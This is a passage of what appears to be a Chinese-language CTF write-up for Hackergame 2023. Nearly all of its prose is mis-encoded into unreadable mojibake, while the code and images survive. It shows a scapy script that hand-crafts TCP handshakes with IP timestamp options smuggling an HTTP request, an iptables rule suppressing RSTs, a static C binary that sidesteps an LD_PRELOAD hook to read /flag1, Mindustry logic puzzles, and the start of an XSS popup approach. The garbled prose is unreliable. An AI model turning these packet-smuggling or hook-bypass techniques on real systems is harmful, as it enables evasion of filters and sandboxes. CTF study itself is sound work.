æˆ‘å½“æ—¶è„‘å­æŠ½äº†æŠŠ IP header Options ç»™æ— è§†äº†ï¼Œè§‰å¾—èƒ½å¤Ÿè‡ªç”±å‘æŒ¥çš„åªå‰© TCP header é‡Œé¢çš„ Optionsï¼Œ`GET / HTTP` æ­£å¥½æ˜¯ 10 å­—èŠ‚ï¼Œç®—ä¸Šåˆšæ‰çš„å°±æ­£å¥½æ˜¯50ã€‚

é‚£äº›ç°æˆçš„å®¢æˆ·ç«¯éƒ½ä¸å¸¦æ”¹ TCP header çš„é€‰é¡¹ï¼Œæˆ‘å±…ç„¶è¿˜è¦è‡ªå·±ç³Š TCP æ•°æ®åŒ…ã€‚

*å“ˆå“ˆï¼Œæ²¡æ•‘äº†ï¼Œæˆ‘è¿™è¾ˆå­è¿˜æ²¡è‡ªå·±å†™è¿‡ä¸‰æ¬¡æ¡æ‰‹ã€‚*

çªå½“æ—¶æ˜¯é‚£ä¹ˆæƒ³çš„ï¼Œäºæ˜¯é—·å¤´å¼€å§‹æäº†ã€‚ä¸€å¼€å§‹æ˜¯æŠ„çš„[è¿™ä¸ª](https://zhuanlan.zhihu.com/p/372206740)ï¼Œscapy æ¨¡æ‹Ÿä¸‰æ¬¡æ¡æ‰‹å‘åŒ…ï¼Œæˆ‘ä¸‰æ¬¡æ¡æ‰‹éƒ½å·²ç»å¿˜å®Œäº†

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-6.png)

![18-1](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-1.png)

é¡ºä¾¿é˜²æ­¢ç³»ç»Ÿä¸»åŠ¨å‘ RST è¿˜å¾—å†è¡¥ä¸€æ¡ iptables è§„åˆ™

```
iptables -A OUTPUT -d 202.38.93.111/32 -p tcp -m tcp --tcp-flags RST RST -j DROP
```

ä¸ç„¶å¥½ä¸å®¹æ˜“å¯¹é¢ SYN-ACKï¼Œç»“æœè‡ªå·±è¿™è¾¹ RST äº†ã€‚

scapy å¯ä»¥è‡ªå·±æ”¹ TCP header optionsï¼Œä½†æ˜¯ä¸å¹¸åœ°ï¼Œæˆ‘çœ‹ä¸æ‡‚å®ƒçš„æ–‡æ¡£ï¼Œå†™å¾—å¤ªå·®äº†ï¼Œ~~è¿ä¸ªä¾‹é¢˜éƒ½æ²¡æœ‰è®©äººæ€ä¹ˆåšé¢˜å•Š~~æ­¤å¤„çœç•¥ä¸€ä¸‡å­—å‹å¥½é—®å€™ã€‚é—® google ä¹Ÿæ²¡ç»“æœï¼ŒGPT ä¹Ÿå˜å¾—è·Ÿä¸ªç¬¨è›‹ä¸€æ ·

äºæ˜¯åªèƒ½æŠŠæˆ‘è‡ªå·±ç³Šçš„ custom options ç›´æ¥æ¥åœ¨ 20Byte TCP header åé¢ï¼Œç„¶åæŠŠ header é•¿åº¦ï¼ˆä¹Ÿå°±æ˜¯ scapy ä¸­çš„ `dataofs`ï¼‰æ”¹ä¸Šå»ã€‚

ä¸è¡Œï¼Œä¸€ç›´éƒ½æ˜¯ HTTP 400ï¼Œè¿ç”µçº¿é²¨é±¼éƒ½ä¸è®¤è¯†æˆ‘å†™çš„ TCP åŒ…ã€‚ç‰¹åˆ«æ˜¯ fast open cookie ä¹Ÿè¿‡ä¸å»çš„æ—¶å€™ï¼Œæˆ‘çœŸçš„å¿«å´©æºƒäº†ï¼ŒçœŸçš„å‡‘äº†å¾ˆä¹…çš„ header å•Šï¼Œä½†æ˜¯ HTTP 400 äº†ã€‚èƒ½ç¡®ä¿¡çš„ä¹Ÿå°±ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯è°ƒèŠ‚ TCP header é•¿åº¦çš„æ—¶å€™å‘ç°ï¼ŒæœåŠ¡å™¨ç¡®å®èƒ½è¾¨è®¤å¤§äº 20 å­—èŠ‚çš„ TCP åŒ…å¤´ã€‚çœ‹äº†çœ‹ç”µçº¿é²¨é±¼æŠ“å‡ºæ¥çš„åŒ…ï¼Œä¸€èˆ¬çš„ HTTP çš„ TCP Options ä¼¼ä¹éƒ½æ˜¯ 12 å­—èŠ‚çš„æ—¶é—´æˆ³ï¼Ÿä½†æˆ‘çœŸå‡‘ä¸å‡ºæ¥ï¼Œä¸€å‡‘å°±æŠ¥é”™ï¼Œä¼°è®¡æ˜¯è¢«ç³»ç»ŸåŠ¨è¿‡äº†ã€‚

<!--ä¸­é—´åå¤å°è¯•å‘åŒ…ç»“æœè¢«å¢™çš„äº‹æƒ…å¤ªä¸¢è„¸äº†ï¼Œå®åœ¨è¯´ä¸å‡ºå£-->

åˆ°è¿™ä¸ªæ—¶å€™å·²ç»å››å¤©æ²¡æ€ä¹ˆåˆçœ¼äº†ï¼Œç²¾ç¥çŠ¶æ€å·²ç»åœ¨å´©æºƒäº†ã€‚æ€ä¹ˆåŠå‘¢ï¼Œè¦ä¹ˆè¯•è¯• IP header Optionsï¼Ÿ

çœ‹äº†çœ‹è¿™ä¸ªä»‹ç» IP Options çš„[æ–‡ä»¶](https://net.academy.lv/lection/net_LS-08ENa_ip-options.pdf)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-4.png)

æ”¯æŒå¤šå­—èŠ‚çš„å››ä¸ªé€‰é¡¹ï¼Œä¸¤ä¸ª source-route æ˜¯ç”¨æ¥è·¯ç”±çš„ï¼Œä¸èƒ½ç”¨ï¼Œå‰©ä¸€ä¸ª RR å’Œ timestamp

è¯• timestamp å§

æ ¹æ® RFC781 çš„è§„å®šï¼š

```
II.  FORMAT SPECIFICATION

     As an IP option, the contents of the first two octets are dictated by the
IP header format to be option type and option length in octets [Postel 80].
The next two octets are used to control this option.


     0               7               15              23              31
     +---------------+---------------+---------------+---------------+
     |     type      |    length     |    offset     |overflw| flags |
     +---------------+---------------+---------------+---------------+
     |                          internet ID                          |
     +---------------+---------------+---------------+---------------+
     |                          time stamp                           |
     +---------------+---------------+---------------+---------------+
                                     .
                                     .
                                     .
     option type = 68 decimal (i.e., option class = 2 and option number = 4);

     option length = the number of octets with a maximum of 40 (limited by
                 IHL = 15);

     offset =    the number of octets from the beginning of this option to the
                 end of timestamps (i.e., the beginning of space for next
                 timestamp).  It is set to one, an odd number, when no more
                 space remains in the header for timestamps;

     overflow =  the number of IP modules that cannot register timestamps due
                 to lack of space;

     flag = 0 -- time stamps only
            1 -- each timestamp is preceded with internet ID of the
                 registering entity
            3 -- the internet ID fields are prespecified.  An IP module only
                 registers its timestamp if it matches its own ID with the
                 next specified internet ID;

     internet ID = ID for the timestamping device;

     timestamp = a right-justified, 32-bit timestamp in milliseconds modulo
                 24 hours from midnight UT.

     The timestamp option is not copied upon fragmentation.  It is carried in
the first fragment.

```

æƒ³è®©å®ƒä¸å†è¢«ä¹±åŠ¨ï¼Œå°±æŠŠ flag ç½® 3 ä¹Ÿå¯ä»¥ï¼Ÿ

ç„¶å offset ç½® 1ï¼Œ

æŠŠ `GET / HTTP` æ‹†å¼€æˆä¸‰æ®µï¼Œç„¶å padding ä¸€ä¸‹å°±å¥½äº†

`\x47\x45\x54\x20` æ˜¯ä¸€ä¸ªåˆæ³•çš„ IPv4 åœ°å€

`\x2F\x20\x48\x54` æ˜¯ä¸€ä¸ªåˆæ³•çš„ unix æ—¶é—´æˆ³

`\x54\x50\x00\x00` ä¹Ÿæ˜¯ä¸€ä¸ªåˆæ³•çš„ IPv4 åœ°å€

æœ€å pad ä¸€ä¸ªæ›´å¤§çš„æ—¶é—´æˆ³å°±å¥½äº† `\x60\x00\x00\x00`

é‚£è¦æ„é€ çš„åŒ…å¤§æ¦‚é•¿è¿™æ ·ï¼š

```python
b'\x44\x14\x01\x03\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x00\x00\x60\x00\x00\x00'
```

ä½†å¥½åƒè¿™æ ·è·‘ä¼šæŠ¥é”™ï¼Œè¯•äº†æŠŠå¼€å¤´çš„ Copy ä½æ”¹æˆ 1 ï¼ˆe.g. `\xC4`ï¼‰å°±å¥½äº†ã€‚

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-5.png)

è¿™æ ·çš„ IP header é•¿åº¦æ˜¯ 40 Byteï¼ŒæŠŠ ihl ç½®ä¸º 10. é¡ºä¾¿ç»ˆäºå­¦ä¼šäº†æ€ä¹ˆåŠ  IPOptions

```python
from scapy.all import *
# src_ip = "149.28.128.196"
# dst_ip = "202.38.93.111"
dst_ip = "192.168.23.1"
dst_port = 18082
src_port = random.randint(1024,65535)
# custom_options_data = b'\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x2F\x31\x2E\x31\r\n'
# custom_options_data = b'\xE7\x0F\x04GET / HTTP\x00\x00\x00'
custom_options_data = b'\xE4\x14\x01\x03\x47\x45\x54\x20\x2F\x20\x48\x54\x54\x50\x00\x00\x60\x00\x00\x00'

spk1 = IP(ihl=10, dst = dst_ip, options=IPOption(custom_options_data)) / TCP(dport = dst_port, sport = src_port,  flags="S")  # sport = random.randint(1024,65535)
spk1.show()
res1 = sr1(spk1)
print(res1)

ack1 = res1[TCP].ack
ack2 = res1[TCP].seq + 1
spk2 = IP(ihl=10, dst = dst_ip, options=IPOption(custom_options_data)) / TCP(dport = dst_port, sport = src_port, seq=ack1, ack=ack2, flags="A")
send(spk2)
print("spk2 sent")

http_post_request = b"POST / HTTP/1.1\r\n" \
                    b"Host: 202.38.93.111\r\n" \
                    b"Content-Length: 101\r\n\r\n" \
                    b"YOUR_TOKEN\r\n\r\n"

spk3 = IP(ihl=10, dst = dst_ip, options=IPOption(custom_options_data)) /  TCP(dport = dst_port, sport = src_port, seq=ack1, ack=ack2, flags=24) / http_post_request
res2 = sr1(spk3)
# print("got res2")
print(res2)

```

ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œç›´æ¥å‘åˆ°å…¬ç½‘ IP æ²¡ååº”ï¼Œä½†æ˜¯åˆè·‘äº†ä¸€éå‰ä¸¤é—®åˆæ²¡é—®é¢˜ã€‚æ¥äº†ä¸€ä¸‹ OpenVPN ä»¥åå¥½äº†ã€‚

ç„¶åç”µçº¿é²¨é±¼æŠ“ä¸€ä¸‹åŒ…å°±å¯ä»¥ã€‚å½“ç„¶æˆ‘åœ¨ VPS ä¸Šé¢è·‘çš„ï¼ŒæŠ“åŒ…ç”¨çš„æ˜¯ 

```sh
tshark -i hgovpn-guest
```

ç„¶ååœ¨ `/tmp` æ‰¾åˆ° pcap æ‹–å›æœ¬åœ°æ‰“å¼€çœ‹åˆ° flagã€‚



---

## ğŸ˜­ğŸ˜­ğŸ˜­ï¼ˆä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag ğŸ˜¡ï¼‰

å”‰è¿™ä¸ªé¢˜é¢å¤ªæŠ½è±¡äº†~~ï¼Œåƒæäº†æˆ‘èˆè»æ—¶æœŸå‘ç–¯çš„æ ·å­~~

é€šè¿‡ LD_PRELOAD å¯¹ç³»ç»Ÿå‡½æ•°ä¸‹æ¯’ï¼Œå°è¯•äº† unsetenv ä¹‹ç±»çš„ä»¥åæ„è¯†åˆ°ä¸å¯¹

é‚£èƒ½ä¸èƒ½è®©å®ƒä¸‹ä¸äº†æ¯’ï¼Ÿ

é™æ€é“¾æ¥~~**ç”¨ go å†™**~~

ç›´æ¥æ¬å‡ºæˆ‘[å»å¹´æ¯çª—é¹…å½±ç¬¬ä¸€é—®](https://blog.h3a.moe/src/EX00007/#flag1)ï¼ˆï¼ˆ

```c
// C program to implement
// the above approach
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
// Driver code
int main()
{
    FILE* ptr;
    char ch;
 
    // Opening file in reading mode
    ptr = fopen("/flag1", "r");
 
    if (NULL == ptr) {
        printf("file can't be opened \n");
    }
 
    printf("content of this file are \n");
 
    // Printing what is written in file
    // character by character using loop.
    ch = fgetc(ptr);
    while (ch != EOF) {
        printf("%c", ch);
        ch = fgetc(ptr);
        // Checking if character is not EOF.
        // If it is EOF stop eading.
    } 
 
    // Closing the file
    fclose(ptr);
    return 0;
}

```

ç„¶åç”Ÿæˆä¸€ä¸ª a.outï¼ˆ

```sh
gcc --static main.c
```





---

## å¼€å…³åºåˆ—ä¹Ÿæ˜¯ä¸€ç§äºŒè¿›åˆ¶ï¼ˆå¼‚æ˜Ÿæ­§é€”ï¼‰

ï¼ˆæ­¤å¤„éœ€è¦ä¸€å¼ ä¹å®«æ ¼æ¢—å›¾ï¼‰

**åšè¿™é¢˜çš„æ‰‹æ„Ÿå°±æ˜¯ï¼šéå¸¸æ•°å­—ç”µè·¯**

mindustry ä¸‹è½½ç•Œé¢å±…ç„¶é€¼æï¼Œé‚£ä¸ªè·³è¿‡çš„å­—å¤ªå°äº†ï¼Œä¸€æ—¶ç«Ÿæ‰¾ä¸åˆ°ï¼Œå·®ç‚¹å¯¹ç€ GitHub Release ä¸€é¡¿æŠ˜è…¾äº†ï¼ˆ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-0-1.png)

è¦è®©å†²å‡»ååº”å †å·¥ä½œã€‚æŠŠå››ä¸ªä¾èµ–çš„æœºå™¨éƒ½å¸¦èµ·æ¥å°±è¡Œï¼Œå†·å´æ¶²ä¼˜å…ˆï¼Œé˜²æ­¢è¿‡çƒ­ã€‚æ‰€ä»¥å»ºè®®å…ˆåšç¬¬ 4 ç»„ã€‚

æ€»å…± 4 æ’ï¼Œå…±è®¡ 32 ä¸ªå¼€å…³ã€‚ç¨å¾®æœäº†ä¸€ä¸‹å‘ç°å¼€å…³æ˜¯ä¸ºå¤„ç†å™¨æä¾›è¾“å…¥çš„ï¼Œäºæ˜¯å»æ‰¾å¤„ç†å™¨ã€‚

ä»å·¦è‡³å³ç¼–å·ä¸º 1-8

===

ç¬¬ä¸€éƒ¨åˆ†å°±æ˜¯è®©é‚£ä¸ªçƒ§ç…¤çš„å°å‘ç”µæœºå·¥ä½œ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-1-1.png)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-1-2.png)

ç‚¹è¿›å»å¥½åƒè¿˜èƒ½å¤åˆ¶å¤„ç†å™¨ä»£ç çš„ã€‚

```
sensor s1 switch1 @enabled
sensor s2 switch2 @enabled
sensor s3 switch3 @enabled
sensor s4 switch4 @enabled
sensor s5 switch5 @enabled
sensor s6 switch6 @enabled
sensor s7 switch7 @enabled
sensor s8 switch8 @enabled
jump 18 equal s1 false
jump 18 equal s2 true
jump 18 equal s3 false
jump 18 equal s4 true
jump 18 equal s5 true
jump 18 equal s6 false
jump 18 equal s7 true
jump 18 equal s8 false
control enabled generator1 1 
end
control enabled generator1 0 
end

```

ä¸€ä¸ªå¼€å…³ç¬¦åˆæ¡ä»¶å°±ä¸èƒ½å¼€æœºï¼Œæ‰€ä»¥å…¨éƒ¨å–å

1010 0101

===

ç¬¬äºŒéƒ¨åˆ† è®©å¤ªé˜³æ¿ç»™æŠ½æ°´æœºä¾›ç”µï¼ŒæŠ½æ°´æœºç»™è’¸æ±½æœºä¾›æ°´ï¼Œçƒ§ç‚‰å­å‘ç”µï¼ˆ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-2-1.png)

```
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
op shl t sw1 7
set number t
op shl t sw2 6
op add number number t
op shl t sw3 5
op add number number t
op shl t sw4 4
op add number number t
op shl t sw5 3
op add number number t
op shl t sw6 2
op add number number t
op shl t sw7 1
op add number number t
set t sw8
op add number number t
set en 0
set i 0
jump 33 greaterThanEq i 16
op pow fl0 i 2
jump 31 notEqual fl0 number
set en 1
jump 33 always x false
op add i i 1
jump 26 always x false
op equal fl1 0 sw1
op equal fl2 0 sw6
op or fl3 fl1 fl2
jump 38 equal fl3 0
set en 0
control enabled generator1 en 
control enabled panel1 en 
end

```

æŒ‰ä½åŠ æƒåº”è¯¥æ˜¯è®¡ç®—åè¿›åˆ¶çš„å€¼

ç„¶åä»1å¾ªç¯åˆ°15çœ‹æ˜¯ä¸æ˜¯æ­£æ•´æ•°çš„å¹³æ–¹ï¼Œè®©ä½¿èƒ½å˜é‡å˜æˆ 1ï¼Œå¹¶ä¸” SW1 å’Œ SW6 è¦å¼€ç€ï¼Œæ‰èƒ½å¯åŠ¨è’¸æ±½ç‚‰å­ï¼Œçƒ§å¼€æ°´å‘ç”µï¼ˆ

ç”»äº†ä¸ªæµç¨‹å›¾é•¿è¿™æ ·ï¼š

```mermaid
flowchart TD
    A(en=0, i=0) --> C{i>=16?}
    C -->|Y| D("FL_3=(!SW1)or(!SW6)")
    C -->|N| E(FL_0=i^2)
    E --> F{FL_0==num?}
    F --> |Y|G(en=1)
    F --> |N|H(i++)
    G --> D
    H --> C
    D --> I{FL_3==0}
    I --> |Y|J[en]
    I --> |N|K[0]
```
æ¸²æŸ“å‡ºæ¥å¤§æ¦‚è¿™æ ·ï¼š

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-2-2.png)

`FL_3==0` é‚£ä¸ªæ¡ä»¶æ”¹å†™ä¸‹è¡¨è¾¾å¼å°±æ˜¯ !(SW1 and SW6)

æƒ³è®© FL_3 ä¸º 0ï¼Œé‚£ SW1 å’Œ SW6 éƒ½æ˜¯ 1ï¼Œä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªæ•°å­—è‡³å°‘æ˜¯ 2^7 + 2^2 = 132ï¼ŒåŒæ—¶å°äºç­‰äº 15^2 = 225

é‚£å°±ä¸€ä¸ªä¸ªè¯•ï¼Œè¿˜å‰© 

```
12 144 = 132 + 12 = 128 + 8 + 4 + 4  

13 169 = 132 + 37 = 128 + 32 + 4 + 4 + 1

14 196 = 132 + 64 = 128 + 64 + 4

15 225 = 132 + 93 = 128 + 64 + 16 + 8 + 4 + 4 + 1 
```

12 13 15 ä¸­ 4 éƒ½è¦å‡ºç°ä¸¤æ¬¡ï¼Œæ’é™¤ã€‚

æœ€ç»ˆç»“æœå°±æ˜¯ 1100 0010 

===

ç¬¬ä¸‰éƒ¨åˆ†

å°å¤„ç†å™¨æ§åˆ¶ç‚®å¡”çš„ï¼Œä¸æ¶‰åŠå¼€å…³ï¼Œæ— è§†

è¦ç»™ååº”å †å–‚ç‡ƒæ–™å’Œå†·å´æ¶²ï¼Œè®©å®ƒå‘ç”µ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-3-1.png)

```
sensor sw1 switch1 @enabled
sensor sw2 switch2 @enabled
sensor sw3 switch3 @enabled
sensor sw4 switch4 @enabled
sensor sw5 switch5 @enabled
sensor sw6 switch6 @enabled
sensor sw7 switch7 @enabled
sensor sw8 switch8 @enabled
sensor sw9 switch9 @enabled
control enabled conveyor2 sw1 
control enabled gate1 sw2 
op equal nsw3 sw3 0
control enabled reactor1 nsw3 
control enabled reactor2 nsw3 
control enabled conduit1 sw4 
control enabled conduit2 sw4 
control enabled mixer1 sw5 
control enabled extractor1 sw6 
control enabled meltdown1 sw7 
control enabled meltdown2 sw7 
op equal result sw8 sw9
jump 28 equal result true
control enabled mixer1 0
control enabled conduit2 1 
control enabled reactor1 1 
control enabled reactor2 1 
control enabled conveyor2 1 
wait 5
end

```

SW1 æ§åˆ¶ conveyor2ï¼Œå¼€é—¸é—¨ï¼Œç»™ååº”å †å–‚çŸ¿çŸ³

SW2 æ§åˆ¶ gate1ï¼ŒæŠŠå†·å´å‰‚è¦ç”¨çš„é’›çŸ¿çŸ³å–‚è¿›è™šç©º

SW3 å–ååï¼Œæ§åˆ¶ååº”å †å¼€å…³ã€‚

SW4 æ§åˆ¶ conduit1/2ï¼Œä¸¤æ ¹ä¸€èµ·æ¼æ°´ï¼Œä¼šå¯¼è‡´å†·å´æ¶²æ— æ³•åˆæˆ

SW5 æ§åˆ¶ mixerï¼Œåˆæˆå†·å´æ¶²

SW6 æ§åˆ¶ extracterï¼ŒæŠ½æ°´ä¸Šæ¥å–‚ç»™ mixer

SW7 æ§åˆ¶ç‚®å°ï¼Œå¼€ä¹…äº†åŠ›åœºä¼šç¼©å°ï¼Ÿæ€»ä¹‹ä¸å¤ªå¦™ï¼Œä¸å¼€

SW8 ä¼šå’Œ SW9 æ¯”è¾ƒï¼Œå¦‚æœä¸åŒï¼Œå°±ä¼šå¼ºåˆ¶æ‰“å¼€é—¸é—¨ã€æ¼æ°´ç®¡å’Œååº”å †ï¼Œå…³é—­å†·å´æ¶²åˆæˆå™¨ï¼Œå¯¼è‡´ååº”å †è¿‡çƒ­çˆ†ç‚¸

===

ååº”å †ä¼šç‚¸ï¼Œæ˜¯å› ä¸ºçŸ¿çŸ³é—¸é—¨æ‰“å¼€ï¼ŒçŸ¿çŸ³æ¶Œå…¥è§¦å‘ååº”å †å¯åŠ¨ï¼Œä½†æ²¡æœ‰è¾“å…¥å†·å´æ°´ï¼Œå¯¼è‡´è¿‡çƒ­ã€‚

**é‚£å…ˆå¼€ SW6 æŠ½æ°´ï¼Œç„¶åå¼€ SW5 åˆæˆå†·å´æ¶²ï¼Œç„¶åç­‰ååº”å †é‡Œå†·å´æ¶²æ»¡äº†å†å¼€ SW1 å–‚çŸ¿çŸ³å°±è¡Œ**

SW9 æ˜¯ä¹‹å‰ç¬¬äºŒç»„çš„ SW8ï¼Œæ˜¯ 0ï¼Œé‚£è¿™è¾¹ä¹Ÿç½® 0

1000 1100

===

ç¬¬å››éƒ¨åˆ† å†²å‡»ååº”å †çš„å†·å´æ¶²æ³µ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-4-1.png)

é«˜å››ä½çš„ 0111 æ˜¯é€ä¸ªæšä¸¾å‡ºæ¥çš„ï¼Œä½å››ä½çš„ 0111 æ˜¯åœ¨è¿™ä¹‹åå«Œæšä¸¾å¤ªæ…¢ï¼Œå‡­æ‰‹æ„ŸçŒœå‡ºæ¥çš„

æ‹¨å¼€å…³çš„æ—¶å€™ä»ç”µè·¯çš„åé¦ˆæœ‰ä¸€ç‚¹ç‚¹æ—¶åºç”µè·¯çš„æ‰‹æ„Ÿï¼Œä½†æ˜¯æœ€åè¶‹ç¨³äº†ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰çš„

```
sensor t switch1 @enabled
control enabled source1 t 
sensor t switch2 @enabled
control enabled source2 t 
sensor t switch3 @enabled
control enabled source3 t 
sensor t switch4 @enabled
control enabled source4 t 
sensor t switch5 @enabled
control enabled source5 t 
sensor t switch6 @enabled
control enabled source6 t 
sensor t switch7 @enabled
control enabled source7 t 
sensor t switch8 @enabled
control enabled source8 t 

```

çœ‹äº†å®˜æ–¹ wp æ‰çŸ¥é“è¿™æ˜¯é—¨ç”µè·¯ï¼Œæˆ‘æ•°å­—ç”µè·¯å…¨éƒ½ç™½å­¦äº†

å°è¯•æ¢å¤äº†ä¸€ä¸‹ç”µè·¯

ç„¶åå¯¹è¿™ä¸ªç”µè·¯å›¾ï¼Œä¸¤ä¸ª NAND åˆè¿› NOT çš„ä½ç½®å¯èƒ½åŠ ä¸ª OR æ›´å®‰å…¨ä¸€äº›ï¼Ÿ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-4-2.png)

é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼Œæ°”åŠ¨å’Œæœºæ¢°çš„é’»å¤´ä¸ç”¨ç”µ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-6-4.png)

é’ååº”å †çš„é‡‘å±æ¥æº

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-6-1.png)

å†²å‡»å †çš„å†·å´æ°´æ˜¯åœ°è¡¨æ°´ï¼Œä¸¤ä¸ªæ°´æ³µæ‰“ä¸Šæ¥ï¼Œæ—è¾¹æ˜¯è™šç©ºï¼Œä½†æ˜¯ä¸ç»™æ‰ä¸‹å»

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-6-2.png)

å†²å‡»å †å†·å´å‰‚çš„é’›æ¥æºï¼Œåœ°å›¾å³ä¸‹è§’äº†

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/20-6-3.png)

---

## XSS æ›´éš¾äº†ï¼Œæ›´æƒ³æ­»æ­»äº†ï¼ˆå¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0 ï¼‰

ä»Šå¹´è¿™é¢˜ç›®æœ‰äº›å¤ªéš¾äº†ï¼Œç›´æ¥ä¸ç»™æˆ‘è‡ªå·±è®¡ç®—ä¸€éçš„æœºä¼šï¼ˆ

![21-1](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-1.png)

å› ä¸ºä¹‹å‰é‚£æ¬¡ XSS åšçš„å¾ˆæˆåŠŸï¼Œå°±è¯¯åˆ¤äº†è¿™æ¬¡çš„éš¾åº¦

æœ¬æ¥è¿˜åœ¨æƒ³æ˜¯ä¸æ˜¯å’Œå»å¹´ä¸€æ ·åœ¨ terminal å°±èƒ½éª—å‡º cookieï¼Œç»“æœå¥½å®¶ä¼™ï¼Œæˆ‘åœ¨æœ¬åœ°è¯•äº†ä¸‹æœ‰å¤´çš„éƒ½æ²¡ååº”ï¼Œæœ¬æ¥è¿˜æƒ³æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•æŠŠ XSS ä»£ç å‹åˆ° 25 ä¸ªå­—ä»¥å†…ï¼Œç›´æ¥è¾“å‡º cookieï¼Œç»“æœï¼š

![21-2](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-2.png)

æƒ³ç›´æ¥åœ¨è¯„è®ºåŒºä¸‹å¤§æ¯’æ˜¯æœ‰ç‚¹éš¾äº†ã€‚

ä½†æ˜¯é¢˜é¢ä¼¼ä¹æœ‰è¯´

> ç›®å‰ä¸»æµçš„æµè§ˆå™¨éƒ½ä¸å…è®¸éšæ„å¼¹å‡ºçª—å£ï¼ˆpopupï¼‰ï¼Œä½†æ˜¯å° X æ˜¯ä¸€ä¸ªå¾ˆå¥½è¯´è¯çš„äººï¼Œéšä¾¿æ‰¾ä¸ªç†ç”±ä»–å°±ä¼šå…è®¸ä½ å¼¹çª—äº†ï¼›è€Œè¿™é‡Œè¿™ä¸ª bot ç”šè‡³ä¸éœ€è¦ç†ç”±ï¼Œå°±ä¼šæ¥æŸ¥çœ‹ä½ çš„å¼¹çª—ï¼ˆå¦‚æœæœ‰ï¼‰ï¼›

æœäº† Google æ€ä¹ˆå¼¹çª—å…¨æ˜¯ `alert()`ï¼Œé‚£å®Œå…¨æ²¡ç”¨å•Šï¼Œbot ä¸åƒ alert å•Š

é‚£æˆ‘å½“ç„¶é—®é—® GPT æ€ä¹ˆå¼¹çª—å¯¹å§ï¼ˆ

é—® popup ç»“æœä¸¢äº†ä¸ª HTML dialog?

![21-4](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-4.png)

**ä¸»æµæµè§ˆå™¨éƒ½ä¼šæ‹¦æˆªçš„å¼¹çª—ï¼Œå¤§æ¦‚æ˜¯åƒå­¦æ ¡æ•™åŠ¡ç³»ç»Ÿé‚£ç§å¤æ—©çš„å¼¹å‡ºå¼çª—å£å§ã€‚**

å†é—®

> I am writing a web app. In some important cases I need to prompt a separate browser window to alert the user for their choice. How can I implement that in JS?
>
> ---
>
> To open a separate browser window or pop-up in JavaScript, you can use the `window.open()` method. Here's how you can implement it:
>
> ```js
> function openPopup() {
>   // Specify the URL of the page you want to open in the popup
>   var popupURL = "https://example.com/your-popup-page.html";
> 
>   // Define the window's properties (size, position, etc.)
>   var windowFeatures = "width=400,height=400,resizable,scrollbars=yes";
> 
>   // Open the popup window
>   var popup = window.open(popupURL, "PopupWindow", windowFeatures);
> 
>   // Check if the browser blocked the popup
>   if (popup == null || typeof popup === "undefined") {
>     alert("Popup blocked! Please enable pop-ups for this site.");
>   } else {
>     // Popup opened successfully
>     // You can do further operations with the 'popup' window object
>     // For example, you can write content to it or communicate with it.
>   }
> }
> 
> ```
>

æ„Ÿè§‰å¿«äº†ï¼Œä½†æ˜¯è¿™ä¸ª `PopupWindow` æ˜¯å•¥

> what does the PopupWindow mean?
>
> ---
>
> In the code example, "PopupWindow" is a name or identifier for the newly opened popup window. It's the name that you give to the popup window when you call `window.open()`. This name is used to refer to the popup window in your JavaScript code if you want to perform further operations on it.
>
> For example, you can use this name to:
>
> 1. Reference the popup window in order to interact with it, such as updating its content or closing it.
>2. Check if a window with the same name is already open. If a window with the same name is open, it will load the new content into the existing window.
> 
> Here's an example of how you might use the name to update the content of the popup window:
>
> ```javascript
>function updatePopupContent() {
>   var popupURL = "https://example.com/updated-popup-content.html";
>   var popupWindow = window.open(popupURL, "PopupWindow", "width=400,height=400,resizable,scrollbars=yes");
> 
>   // You can access the popup window by its name and interact with it
>     if (popupWindow) {
>     // For example, you can change its location
>     popupWindow.location = popupURL;
>   }
> }
> ```
> 
> So, "PopupWindow" is just a user-defined name that helps you refer to the popup window in your code. You can use any name you like, but it should be unique within your application to avoid conflicts with other window names.

æ˜¯å¼¹å‡ºçª—å£çš„åå­—ï¼Œå»çœ‹çœ‹ MDN [æ€ä¹ˆè¯´çš„](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)

![21-6](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-6.png)

ç©ä¸€ä¸‹çœ‹çœ‹ï¼Œè‰ï¼ŒçœŸçš„ä¼šæ‹¦æˆª

![21-7](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/21-7.png)

